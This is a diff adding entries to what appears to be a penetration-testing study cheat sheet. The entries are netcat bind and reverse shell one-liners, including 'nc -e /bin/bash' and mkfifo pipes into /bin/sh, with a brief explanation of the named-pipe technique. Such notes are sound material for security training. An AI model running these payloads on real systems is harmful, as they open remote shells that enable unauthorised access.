@@ -949,4 +949,15 @@ Bind shell
 - ``` socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 - ``` attacker.
 
 **Common Shell Payloads**
+- ``` nc -lvnp <PORT> -e /bin/bash ``` bind shell on the target
+- ``` nc <LOCAL-IP> <PORT> -e /bin/bash ``` reverse shell, connect back
 
+create a listener for a bind shell:
+- ``` mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f ```
+- creates a named pipe at /tmp/f
+- connects the input of the listener to the output of the named pipe.
+- output of the netcat listener (i.e. the commands we send) then gets piped directly into sh.
+
+nc reverse shell:
+- ``` mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f ```
+- 
